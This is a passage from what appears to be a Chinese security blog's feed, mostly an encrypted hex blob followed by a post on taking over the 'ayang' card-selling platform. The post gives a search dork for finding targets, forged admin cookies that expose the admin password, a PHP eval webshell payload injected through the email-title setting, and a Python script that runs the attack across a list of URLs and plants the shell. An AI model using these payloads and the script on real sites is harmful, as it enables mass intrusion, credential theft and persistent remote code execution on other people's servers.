46d1d1420c29270c71c762e08621660f64c2274a77bdfe4b8f5f7185da1743bb7843cad4e41baf9c39372165fb6cdce26eac84b9a49cf91e68456ea010e4a505f8d21f9d9a80a4b673d2d519f84281d35400323a6e20d925d0ca5e98bdfcb57f36cdbbb9d87a541009340ed220e91cf00a9be882214c8d34622cacb53e210a8383c4b6f1ebc68054431d314ead9dd996301d191442a910b5ba8036afbfc112e2eb499f8bd530933fd935b98978fa1c87ad0630d9efe2c798dada1ccafee29709feed309f1d186d460af7e6bd36fde13e89c1b32c7e70f3a6a8bc0cf447535632486af57915f5d4e0f2a523c8b0464988820ac478731c250c4919350bb7d8a1c81073f01279c0bafd4eb83dae712da4683ebb30ad92ff991270734bb43bcdfdf5dbbe1d9fc362963eff24240a1168debf8b5a9a4245a7bdec85f7d545d7ba36119592b355264fc0456290741df30816e06be27392a1ddf6d95e550bfd16a47c8de7de14f2a0b1eef9db5fc26d3f914b3704793945f66d2a1c3c13ccde5cc706ea113ae0995606b790bf8ca6a8c6f79bf050d668084385d95c7d74e0419bf02f2594ade1dcf8272d6588ba283e235710be730c82a8d679fa4b0cfc0ef4340f3b9d51049700b033732f471c5e17394aa8b6b2133e1ed8f267631eee3a7120464b43063494f1b8e972874b86a9ac2884d44dcac24608d3d1ff66b6809c62b1bdb8a83c403f5329ac3ad6397eef8f00f52effa409d1440d367612d9891c08666d775d8954b9a39ed76ad53c248a8c8f4361e2f7264a00a906c98d0c45217a194a7a4275790eb0720d1bfa5e118f80379afa2ea1732a54fc08abe3d04527a304fa28d7e07a35b3ec6073ce791737547226d1aa84f4125e6f80a4304626580500d23cb4a4c22f860ef9c37b3c4dbb652603a0e62e2e50b20b8702030d37e8408ce03da44c89e80c901b60d7fd09b3fd8c084654f9022c01d46d8b3dc16a2ff2bea8f578ec4adf246fc2dafd1da20301b97e78c86bb7f2cc1ac1f1513d676feee8a513e002852185d06782b10c733272edb9c0df48750371ae74a655837349d53ff003ebd1d29889db7afb61eee2a3308554cd24009f6dcf8d3775507c61b5fca7417d44ff77effaa30d9a44cb0853070a2884bd0fd290395124a13f7e360f28611bf899b64a548439fd75643b0c573b7a6a160df7e6cf1301e06185657b749621145bdc668515af90528e186d99793ee49735dddd67ea6a9bbfd03aa206c7e37b5ebe53bcec6c8f4fb53585d708fafd7e46c3b5274610c29846ce8e2d881f5415575b8302f0441394e71655eb49d90e99b2503b3eb0b99735242b86c0d95d46b96e0369e6e510306de93f5b299996620c41a9736545539d1906c7964be101d569b9d7c9d03499cd3b585fffbcd92145fead284387dddfc16f1d6dc37f8171a69011ddce822bcd6f333d6178d71054a9abc523724ed6925040283924f6d3c2d126acc67bdc73d388ee5f89b6ae72df4a38743200b2d4c085faac45e992b2f043c1558f7469d0e567aaff1539976a0789822a158f495a5600da70f4620baf29d2c552cce1607f6547b31cad9cac93bc4e251ce20312c750fe50d50b3e8206ea97797f281aa957b62185ab37c35ee354dbd80db713625c8020cf70c94910bf17ba6c9d48408e493a8b20522a895a8a3c5285bb3340e082a9d919f718f5263887a016bb79f3d8e8d32d5828264384a8ad598eb2908953c0dce513c263b3e01365231ae55c75c431167534a30ff8cb7f3653075fb862cfd6fe2942cec3075fce917fd40cdf78d56bb8d718abca2cb2a57962a2cd4aaade1e1751df94184cb6e1c47cbaaf033cd81b7a5c4885d3838b96d5fec01f499f47a44004da459855f9736efa10f493d2a112eb5f7cac410af11ea689d589a3764bdeebdc9dd95469a11e6926d6f137aa696ebb917754349be009fb1b032d9e4ea7a2cdfcea527a29cde9c4b860f852fc077af9c2d9f481051a14be807717553494d6f104d2065f1a1449c4f5236e701994d94f099af49fda44c70f56c769a831132b350708bcf99a2117e06e8be2a84b54a7c624af59b54020cbdd739c949168709d5f6f71e460874dbbe9c2f42743aabde0f0f3188365825dfebeddfa77cbd0ccd3ac2fb4f7fabd1d8f68aa02de2fbf2579def359f0d497fa915fd098b805c512ca498dee29c6564da57d102a0e94123ad92bdf9da23cfaef53df3a54bfbf6856cbf88b70a07606b0309a7edf9d83ea42893f4540ea29d3f0322ded87cb853fe4d4e1e6b2b9a9f69c41b1c0962432fdc73a7b9d860326c9268d2c72666d1a8044618a761de21f67239f80ae0d5c5b17293206143d2c383ed349b4f4bbd94a7e2fcac8b8c46ddcd9164220d8bdd48595ed93ec83f3a7d7a5e58441e2f9e685485810ba89f17ad0a2ab9cf7b7837c9ddc01069adb581dde044a0923a13b354022c35a16f16f1a4c55cb2f1ecd46f9f5f39225d5845fa710e043eec9f14c2ba90b3a32430692f882868b2ff3d8ed2d67d2342dc469e97584f277450e2e5391a68dd8457fe9eb1df56c4c5195febc113718ffc3e46e6a757b192f2c665d48c41f0d8fcfd1b4f156ed0c8707d3d2227903b8fd2b1c0d8cbc3bdd96c67061d72d5d5e2c350e09645792d4f392ea42447e73fb5b3e4ac8e3b8dd75c6d52679a0c102120891e21cd8b76d723df8ce3996084a63b18064777712e0cab6790d58d3d706f84b16d7b78e8a304293aca53bef588e36f5d28dd97c6904df9c4bf7f087786700cc1ac086b5e01077e17b2cb2800ef4f0d22cb431153ddde9208d67df71344e3c945d57f3baa71a92297fb02286866be0e787984e7c6ced15f6a9ee2144d514385ef054cad184107f36899b5219e96aa7455fca1769bd2a94ca66a6e19c85e8f46eabe7aac987b75bf3de88218ec7266d638e4d508921bc23adb8cc48565bce914bfa0bc37183d3b3d615e9008fe86ac68e3901f51a954ef6091cb7c74b827a4d7a1bf82e70bbaaea6139e58781edd2cdefaedb0f9838d20ccbeb8e2caf6d7c88d706f916fd42a9c50d0b76c476f16a5e614371d07856e06f3fad89f33384fba8cd3213f5959b90df8f88fa936b813bfea6f7ec4be6e7aaf7bb8e4202e5e4828433b8de38be2fc428bf737c8e538b944189ca22bd6d390bdb85f7564bd8a99be0592138cb6211d3f71270c30c43565cc6723e589847b9812db7fa1d54e790775ed20e1532ebe2d6e497aa331d164360a3579d392f4eaa4202c3f3eae9515410d503e5befdff1609196acfa84f3d175eaaa7ef28574e58388150c0daa3396395a1367ef27cb187d4b8527bf85a6d1943873271809353c383109891011c96c9d70691486bf8ba6a98dd1fb61a1e9a594b3dabc87f4809c63db62194f206f80f47aa38862fb0741835ab090443515a6b14718697435bb87a7b051b4c179ee9f13bf7a2f31f64a870237a633f8f9537c1019005d2b0ac5413a4f721c37ec78a4f15106196ea7b2376963e0504d01f0d86e765785e9ffaf7b38c3365e314aa3782c7abbb2ff9245a4cf62e95c5cfc409be78c171b65140878856f13baf30ee3a9bc498d1b299539077d69737fe09f4ecdf088b3f9d6613230c6a30b791c781ebfda7bfb82bbd8ae6a798cbb16c8b98bc304ae5d951f235f12435da62056fc36f54aac88bcaaab445c95ea3a71432d554f2cedc510ef75ea4aececd27886411bc52617825367c1a4b9b8365ed31ac2b627a815f100ec34b1b8ef73cfde33029e702f6c6e378929bc3776f67c8ea2952e13c1492864a4c8d08e9393df14d906ba567b46bd5f0e217e6446f5caec9beaa2394bce01c5aa486fd158a3718fb4ebf0c3706402240695cb5c785ec8c1f18c78cd3e7f30924c1178d198b9e45f9ec67f035bcaa53c0744089fb580a3814979eca2882a0087f2a407a0326e6953113708d70a5bb6ac49e2c14a17acd1256686db9fae9f90440d07c644bb881cccad42b05ee5b26d53b11fd67b867257770ebe86471dbdce8d93179dfc0425f1f46ba4d1d842487f1531fa5d13430b64f994b6c976182d28a0e07a0747055dd7707e343e4f7aeae4ad164c0d1895349ba1904764b5912decbec5ad714dad4ec560fcfe73516c917ffd172eab5b47495baad7e7f7da7dc18ed275564e9ac75c7506a8e7b19a0cd18365bc47fa99035df55eea3ed4d43eacf34e065f6e0383b92536eae56f5dec6c7f7e0a745b3d25cbf36d531c9365e86b5f3abba36417dcf808d243a8f9a9848e0caf9f01b017b392b386ae17a4ce88e0604070bc59ca5e679c8bba63ead7b7ca13b48913af9f21cbd1b22c6283c70673c1862bf1c9bb9ed1ef4399ca457d8cb6cfdf9775f8a7eb3a918f65fd4df63fc0f7fbd82a39c6c5cc4bd3af14171573e7ab0dd1488a63e3810f3b55798014d6415bfa11f5f10d88215057dbdf1ca50a0d8325ff352048b62638da04712212d8f0e289e533c97847b06474c35869ba07df76b3cefc3ed2b18aace80f6e676a7d0deff21fe8563f00aeda7ed1cf0d6587424edbe5770836a858092a70a2e3a6c0021658982dbceec723b6bce66cc5fbc3fcc7b89ac359252cf532754e519b7c2e772a6bec7894cf79a27018d363a4a9fc0d18e9405a3bbe3366e5f57d53688296c3f2e2262c95f4f091d89ffef7095240a386ed17db1d416bc9b846dc523e9cd923819cf23791ed46db9e16d67324312c10b1f808645d4b2cd5f510817aff264675e13fe2e82a9718652013bee6cf29110eb10a7973b42c5a2a03190c05d9d0e709e7ec8a9aa1332e81c8917c78f616bc111b2a43b27d2c523dff2fc6a195937b2fadfb6fad721117ea37c64eb839ba6f33cd16cf2f2861ccccb1ad30df74f97d8e7e1d65823aa7543bc8fe1a8ab36673cebab25316578c8fec277bd1ae12ce8fcde8cd6548efbc8bd57b9ac853648faaa2438de29ad6f412c5baddf9c2e61d9666da21fc53abc7c20104da2304b004f2772a7c5a4c38ce625822a953ea7b001ad5dc63cd530e3b35ce68348c5b98065c4e13ffc0b7a4a0273713ad6516aaca7514b0fe8bc290821465f129122ef779e68fda956cae6602504144abdbc2eccb7ef9a7b90960c3c94b41369fb0ab87d02f028951d3ad1474921459611ba05b8a474fe9ae63b1c9604c2c5d6cbaf05827579e35564aaaf1f1e90e76c299219972e0a57fb34d7bbfe7123140b7cd180ea2104d2e258832a54c7337e69a264e27c090d07157e58cb47cedeed4889656936aebb9b6d95278203ed351c07b24a5cad09b431ff153d0851498573ba460bb9944920fd55c770a8bc0f51a49b540410c33966dcc5fffe0aef91a9e4361d2022f4a09d54d8453058791f54ee7da07eec6c5600d3b2f8a0f0b8be7db61cc1852626024ecf4e152609744d712c6daa4ad602fe26f7fc4</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      伯乐发卡漏洞
    
    </summary>
    
    
      <category term="代码审计" scheme="http://h3art3ars.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="漏洞" scheme="http://h3art3ars.github.io/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="cms" scheme="http://h3art3ars.github.io/tags/cms/"/>
    
      <category term="实战" scheme="http://h3art3ars.github.io/tags/%E5%AE%9E%E6%88%98/"/>
    
  </entry>
  
  <entry>
    <title>ayang发卡平台getshell</title>
    <link href="http://h3art3ars.github.io/2020/02/25/ayang%E5%8F%91%E5%8D%A1%E5%B9%B3%E5%8F%B0getshell/"/>
    <id>http://h3art3ars.github.io/2020/02/25/ayang%E5%8F%91%E5%8D%A1%E5%B9%B3%E5%8F%B0getshell/</id>
    <published>2020-02-25T02:11:57.000Z</published>
    <updated>2022-05-24T12:19:57.243Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞搜索"><a href="#漏洞搜索" class="headerlink" title="漏洞搜索"></a>漏洞搜索</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">inurl:admin&#x2F;set.php</span></pre></td></tr></table></figure><h2 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h2><ol><li>admin后台文件校验cookie，可直接查看密码</li><li>后台设置有任意文件写入漏洞</li></ol><h2 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h2><p><code>/admin/set.php</code></p><p>验证漏洞代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">if($.cookie(&quot;user&quot;) &#x3D;&#x3D; null || $.cookie(&quot;user&quot;) &#x3D;&#x3D; &quot;&quot; || $.cookie(&quot;loginInfo&quot;) !&#x3D; $.md5($.cookie(&quot;pass&quot;)))&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">    window.location.href&#x3D;&#39;.&#x2F;login.php&#39;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">    &#125;else&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr></table></figure><p>任意文件写入代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">elseif($_GET[&#39;mod&#39;]&#x3D;&#x3D;&quot;sfEmail&quot;)&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">    if($_POST[&#39;host&#39;] &#x3D;&#x3D; &quot;&quot; || $_POST[&#39;port&#39;] &#x3D;&#x3D; &quot;&quot; || $_POST[&#39;user&#39;] &#x3D;&#x3D; &quot;&quot; || $_POST[&#39;from&#39;] &#x3D;&#x3D; &quot;&quot;)&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">        showmsg(&quot;重要信息不能为空！&quot;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">        exit();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">     $text&#x3D;&quot;&lt;?php</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line"> \$emailConfig &#x3D; array(</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">  &#39;host&#39;&#x3D;&gt;&#39;&quot;.$_POST[&#39;host&#39;].&quot;&#39;,&#x2F;&#x2F;邮箱的服务器地址</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">  &#39;fromName&#39;&#x3D;&gt;&#39;&quot;.$_POST[&#39;fromName&#39;].&quot;&#39;,&#x2F;&#x2F;设置发件人姓名（昵称） 任意内容</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">  &#39;port&#39;&#x3D;&gt;&#39;&quot;.$_POST[&#39;port&#39;].&quot;&#39;,&#x2F;&#x2F;端口</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">  &#39;user&#39;&#x3D;&gt;&#39;&quot;.$_POST[&#39;user&#39;].&quot;&#39;,&#x2F;&#x2F;邮箱账号</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">  &#39;pwd&#39;&#x3D;&gt;&#39;&quot;.$_POST[&#39;pwd&#39;].&quot;&#39;,&#x2F;&#x2F;邮箱密码</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">  &#39;from&#39;&#x3D;&gt;&#39;&quot;.$_POST[&#39;from&#39;].&quot;&#39;,&#x2F;&#x2F;设置发件人邮箱地址 这里填入上述提到的“发件人邮箱”</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">  &#39;title&#39;&#x3D;&gt;&#39;&quot;.$_POST[&#39;title&#39;].&quot;&#39;&#x2F;&#x2F;添加该邮件的主题</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">  );</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">?&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">&quot;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">     saveFile(&quot;..&#x2F;emailConfig.php&quot;,$text);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">     showmsg(&quot;ok!&quot;,1);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line"> &#125;</span></pre></td></tr></table></figure><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ol><li><p>添加cookies：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">COOKIES &#x3D; &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">            &quot;user&quot;: &quot;admin&quot;,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">            &quot;pass&quot;: &quot;admin&quot;,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">            &quot;loginInfo&quot;: &quot;21232f297a57a5a743894a0e4a801fc3&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">            &#125;</span></pre></td></tr></table></figure></li><li><p>访问 <code>http://domain/admin/set.php?mod=admin</code> 看到管理员密码</p></li><li><p>进入 系统设置-&gt;发件邮箱设置-&gt;邮件标题 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">a&#39;);$x&#x3D;&amp;$y; $y&#x3D;$_POST[&#39;cmd&#39;]; function a() &#123;     global $x;     return $x; &#125; eval(a());?&gt;&#x2F;*</span></pre></td></tr></table></figure></li><li><p>之后蚁剑连接 <code>http://domain/emailConfig.php</code> 密码<code>cmd</code></p></li></ol><h2 id="漏洞EXP【py】"><a href="#漏洞EXP【py】" class="headerlink" title="漏洞EXP【py】"></a>漏洞EXP【py】</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"># encode&#x3D;utf-8</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"># search inurl:admin.php</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">import requests</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">import re</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">import pyfiglet</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">COOKIES &#x3D; &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">            &quot;user&quot;: &quot;admin&quot;,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">            &quot;pass&quot;: &quot;admin&quot;,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">            &quot;loginInfo&quot;: &quot;21232f297a57a5a743894a0e4a801fc3&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">            &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">def geturls():</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">    with open(&quot;url.list&quot;) as f:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">        urls &#x3D; f.readlines()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">        return urls</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">def check(url):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">#    url &#x3D; &quot;http:&#x2F;&#x2F;debug.com&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">    purl &#x3D; url.strip() + &quot;&#x2F;admin&#x2F;set.php?mod&#x3D;admin&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">    res &#x3D; requests.post(purl, cookies&#x3D;COOKIES)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line">    if res.status_code &#x3D;&#x3D; 200:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line">        print(&quot;[+]Getting password&quot;)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">29</span></pre></td><td class="code"><pre><span class="line">        print(res.text)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">30</span></pre></td><td class="code"><pre><span class="line">#        getpass(res.text)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">31</span></pre></td><td class="code"><pre><span class="line">    else:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">32</span></pre></td><td class="code"><pre><span class="line">        exit(&quot;Got password failed&quot;)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">33</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">34</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">35</span></pre></td><td class="code"><pre><span class="line">def getpass(text):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">36</span></pre></td><td class="code"><pre><span class="line">    user &#x3D; re.search(r&#39;&#39;, text)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">37</span></pre></td><td class="code"><pre><span class="line">    pwd &#x3D; re.search(r&#39;管理员密码&#123;30,50&#125;&#39;, text)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">38</span></pre></td><td class="code"><pre><span class="line">    if user is not None and pwd is not None:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">39</span></pre></td><td class="code"><pre><span class="line">        print(user + &quot; : &quot; + pwd)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">40</span></pre></td><td class="code"><pre><span class="line">    else:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">41</span></pre></td><td class="code"><pre><span class="line">        exit(&quot;[-]Cant&#39;t find pass!&quot;)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">42</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">43</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">44</span></pre></td><td class="code"><pre><span class="line">def banner():</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">45</span></pre></td><td class="code"><pre><span class="line">    pyfiglet.print_figlet(&quot;f a k a p a s s&quot;, colors&#x3D;&quot;GREEN&quot;)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">46</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">47</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">48</span></pre></td><td class="code"><pre><span class="line">def write_shell(url):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">49</span></pre></td><td class="code"><pre><span class="line">    purl &#x3D; url + &quot;&#x2F;admin&#x2F;set.php?mod&#x3D;sfEmail&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">50</span></pre></td><td class="code"><pre><span class="line">    data &#x3D; &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">51</span></pre></td><td class="code"><pre><span class="line">            &quot;host&quot;: &quot;smtp.163.com&quot;,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">52</span></pre></td><td class="code"><pre><span class="line">            &quot;fromName&quot;: &quot;个人发卡平台&quot;,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">53</span></pre></td><td class="code"><pre><span class="line">            &quot;port&quot;: &quot;25&quot;,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">54</span></pre></td><td class="code"><pre><span class="line">            &quot;user&quot;: &quot;706672193&quot;,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">55</span></pre></td><td class="code"><pre><span class="line">            &quot;pwd&quot;: &quot;706672193&quot;,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">56</span></pre></td><td class="code"><pre><span class="line">            &quot;from&quot;: &quot;706672193@qq.com&quot;,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">57</span></pre></td><td class="code"><pre><span class="line">            &quot;title&quot;: &quot;a&#39;);$x&#x3D;&amp;$y; $y&#x3D;$_POST[&#39;cmd&#39;]; function a() &#123;     global $x;     return $x; &#125; eval(a());?&gt;&#x2F;*&quot;,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">58</span></pre></td><td class="code"><pre><span class="line">            &quot;submit&quot;: &quot;修改&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">59</span></pre></td><td class="code"><pre><span class="line">            &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">60</span></pre></td><td class="code"><pre><span class="line">    res &#x3D; requests.post(purl, data&#x3D;data, cookies&#x3D;COOKIES)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">61</span></pre></td><td class="code"><pre><span class="line">    if res.status_code &#x3D;&#x3D; 200:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">62</span></pre></td><td class="code"><pre><span class="line">        print(&quot;[+]Write shell successfully!&quot;)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">63</span></pre></td><td class="code"><pre><span class="line">    else:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">64</span></pre></td><td class="code"><pre><span class="line">        print(&quot;[-]Write shell failed!&quot;)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">65</span></pre></td><td class="code"><pre><span class="line">        exit(&quot;exited&quot;)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">66</span></pre></td><td class="code"><pre><span class="line">    res &#x3D; requests.get(url+&quot;&#x2F;emailConfig.php&quot;)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">67</span></pre></td><td class="code"><pre><span class="line">    if res.status_code &#x3D;&#x3D; 200:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">68</span></pre></td><td class="code"><pre><span class="line">        print(&quot;[+]Shell path : &quot;+url+&quot;&#x2F;emailConfig.php&quot;)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">69</span></pre></td><td class="code"><pre><span class="line">        print(&quot;[+]Shell password : cmd&quot;)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">70</span></pre></td><td class="code"><pre><span class="line">    else:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">71</span></pre></td><td class="code"><pre><span class="line">        print(&quot;[-]Shell path is changed !&quot;)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">72</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">73</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">74</span></pre></td><td class="code"><pre><span class="line">def mainf(isw&#x3D;0):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">75</span></pre></td><td class="code"><pre><span class="line">    banner()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">76</span></pre></td><td class="code"><pre><span class="line">    urls &#x3D; geturls()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">77</span></pre></td><td class="code"><pre><span class="line">    for url in urls:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">78</span></pre></td><td class="code"><pre><span class="line">        if url[0] &#x3D;&#x3D; &quot;#&quot;:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">79</span></pre></td><td class="code"><pre><span class="line">            continue</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">80</span></pre></td><td class="code"><pre><span class="line">        if &quot;http:&#x2F;&#x2F;&quot; !&#x3D; url[0:7] and &quot;https:&#x2F;&#x2F;&quot; !&#x3D; url[0:8]:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">81</span></pre></td><td class="code"><pre><span class="line">            url &#x3D; &quot;http:&#x2F;&#x2F;&quot; + url</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">82</span></pre></td><td class="code"><pre><span class="line">        print(&quot;URL:&quot; + url)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">83</span></pre></td><td class="code"><pre><span class="line">        check(url)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">84</span></pre></td><td class="code"><pre><span class="line">    if isw !&#x3D; 0:</span></pre></td></tr><tr><td 